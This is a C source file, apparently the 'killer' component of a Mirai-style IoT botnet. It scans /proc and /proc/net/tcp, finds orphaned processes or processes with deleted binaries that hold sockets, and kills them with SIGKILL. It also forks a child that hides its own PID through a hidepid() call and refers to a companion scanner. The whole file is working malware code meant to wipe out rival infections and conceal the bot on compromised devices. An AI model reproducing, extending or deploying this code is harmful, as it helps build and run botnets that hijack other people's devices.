#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <fcntl.h>
#include <stdlib.h>
#include <signal.h>
#include <dirent.h>
#include <limits.h>
#include <sys/prctl.h>
#include <arpa/inet.h>

#include "headers/bool.h"
#include "headers/kutil.h"
#include "headers/util.h"

static char self_realpath[PATH_MAX] = {0}, fds[] = {'0', '5'};

typedef struct {
    char *inode;
} inode_t;

typedef struct {
    int len;
    char *realpath;
} realpath_t;

int inode_index, realpath_index;

inode_t *inode_list = NULL;
realpath_t *realpath_list = NULL;

static char *get_inode(char *buf) {

    int len = kutil_strlen(buf);

    for (int i = 91; i < len; i++) {
        if (buf[i] == ' ') {
            buf[i] = 0;
            return buf + 91;
        }
    }

    return NULL;
}

static void append_inode(char *inode) {

    inode_list = realloc(inode_list, (inode_index + 1) * sizeof(inode_t));
    inode_list[inode_index++].inode = kutil_strdup(inode);
}

static BOOL check_deleted(char *realpath) {

    int fd = open(realpath, O_RDONLY);

    if (fd == -1)
        return TRUE;

    close(fd);
    return FALSE;
}

static BOOL find_realpath(char *realpath) {

    for (int i = 0; i < realpath_index; i++) {
        if (!kutil_strcmp(realpath, realpath_list[i].realpath))
            return TRUE;
    }

    return FALSE;
}

char *get_PPid(char *buf, int buf_len) {

    int len = kutil_memsearch(buf, buf_len, "ppid", 4);

    if (len == -1)
        return NULL;

    return buf + (len + 1);
}

static BOOL fine_inode(char *inode) {

    for (int i = 0; i < inode_index; i++) {
        if (!kutil_strcmp(inode, inode_list[i].inode))
            return TRUE;
    }

    return FALSE;
}

static BOOL check_fd_path(char *pid) {

    char fd_path[32] = {0};

    kutil_strcpy(fd_path, "/proc/");
    kutil_strcat(fd_path, pid);
    kutil_strcat(fd_path, "/fd/");

    int len = kutil_strlen(fd_path);

    for (unsigned int i = 0; i < sizeof(fds) / sizeof(fds[0]); i++) {
        fd_path[len] = fds[i];

        int rdbuf_len;
        char rdbuf[32] = {0};

        if ((rdbuf_len = readlink(fd_path, rdbuf, sizeof(rdbuf) - 1)) == -1)
            continue;

        if (!i) {
            if (!kutil_strncmp(rdbuf, "/dev/null", 9) || !kutil_strncmp(rdbuf, "/dev/console", 12))
                return FALSE;
        }

        if (!kutil_strncmp(rdbuf, "/proc/", 6 - 1))
            return TRUE;
        else if (!kutil_strncmp(rdbuf, "socket", 6)) {
            rdbuf[rdbuf_len - 1] = 0;
            
            if (fine_inode(rdbuf + 8))
                return TRUE;
        }
    }

    return FALSE;
}

static BOOL check_status(char *pid) {

    char status_path[32] = {0};

    kutil_strcpy(status_path, "/proc/");
    kutil_strcat(status_path, pid);
    kutil_strcat(status_path, "/status");
    
    int fd = open(status_path, O_RDONLY);

    if (fd == -1)
        return FALSE;

    char rdbuf[256] = {0};

    int len = read(fd, rdbuf, sizeof(rdbuf) - 1);

    close(fd);

    if (len <= 0)
        return FALSE;

    char *PPid = get_PPid(rdbuf, len);

    if (PPid == NULL)
        return FALSE;

    if (atoi(PPid) == 1 && check_fd_path(pid))
        return TRUE;

    return FALSE;
}

static void append_realpath(char *realpath) {

    realpath_list = realloc(realpath_list, (realpath_index + 1) * sizeof(realpath_t));
    realpath_list[realpath_index++].realpath = kutil_strdup(realpath);
}

static BOOL check_realpath(char *pid) {

    char exe_path[32] = {0}, realpath[PATH_MAX] = {0};

    kutil_strcpy(exe_path, "/proc/");
    kutil_strcat(exe_path, pid);
    kutil_strcat(exe_path, "/exe");

    if (readlink(exe_path, realpath, sizeof(realpath) - 1) == -1 || !kutil_strcmp(realpath, self_realpath))
        return FALSE;

    if (check_deleted(realpath)) {
#ifdef DEBUG
        printf("[killer] pid: (%s) | realpath: (%s) is deleted\n", pid, realpath);
#endif
        return TRUE;
    }

    if (check_status(pid)) {
#ifdef DEBUG
        printf("[killer] found pid: (%s) | realpath: (%s)\n", pid, realpath);
#endif
        if (!find_realpath(realpath)) {
            append_realpath(realpath);
#ifdef DEBUG
            printf("[killer] added realpath: (%s) to list\n", realpath);
#endif
        }

        return TRUE;
    }

    return FALSE;
}

static BOOL compare_realpath(char *pid) {

    char exe_path[32] = {0}, realpath[PATH_MAX] = {0};

    kutil_strcpy(exe_path, "/proc/");
    kutil_strcat(exe_path, pid);
    kutil_strcat(exe_path, "/exe");

    if (readlink(exe_path, realpath, sizeof(realpath) - 1) == -1)
        return FALSE;

    if (find_realpath(realpath)) {
#ifdef DEBUG
        printf("[killer] found pid: (%s) | realpath: (%s) from list\n", pid, realpath);
#endif
        return TRUE;
    }

    return FALSE;
}

static void killer(void) {

    int fd = open("/proc/net/tcp", O_RDONLY);

    if (fd == -1) {
#ifdef DEBUG
        printf("[killer] open() failed\n");
#endif
        return;
    }

    char rdbuf[256] = {0};

    while (kutil_read(fd, rdbuf, sizeof(rdbuf) - 1)) {
        char *inode = get_inode(rdbuf);

        if (inode == NULL || inode[0] == '0' || inode[0] == 'i')
            continue;

        append_inode(inode);
    }

#ifdef DEBUG
    for (int i = 0; i < inode_index; i++)
        printf("[killer] inode_list[%d].inode: (%s)\n", i, inode_list[i].inode);
#endif

    if (readlink("/proc/self/exe", self_realpath, sizeof(self_realpath) - 1) == -1) {
#ifdef DEBUG
        printf("[killer] readlink() failed\n");
#endif
        return;
    }

#ifdef DEBUG
    printf("[killer] self_realpath: (%s)\n", self_realpath);
#endif

    DIR *dir = opendir("/proc/");

    if (!dir) {
#ifdef DEBUG
        printf("[killer] opendir() failed\n");
#endif
        return;
    }

    struct dirent *file;
    int loc = 0;

    while ((file = readdir(dir))) {
        if (*file->d_name >= '0' && *file->d_name <= '9') {
            loc = telldir(dir);
            break;
        }
    }

    seekdir(dir, loc);

    while ((file = readdir(dir))) {
        if (check_realpath(file->d_name)) {
            kill(atoi(file->d_name), SIGKILL);
#ifdef DEBUG
            printf("[killer] killed pid: (%s)\n", file->d_name);
#endif
        }
    }

    if (realpath_index) {
        seekdir(dir, loc);

        while ((file = readdir(dir))) {
            if (compare_realpath(file->d_name)) {
                kill(atoi(file->d_name), SIGKILL);
#ifdef DEBUG
                printf("[killer] killed pid: (%s)\n", file->d_name);
#endif
            }
        }

        free(realpath_list);
    }

    free(inode_list);

#ifdef DEBUG
    printf("[killer] finished\n");
#endif
    closedir(dir);
}

void killer_init(void) {

    if (!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGKILL);
        hidepid(getpid());
#ifdef DEBUG
        printf("[killer_init] killer started: (%d)\n", getpid());
#endif
        killer();
        exit(0);
    }

    sleep(1); // prevent the scanner from starting so when the killer runs we don't get the inodes from the scanner.
}
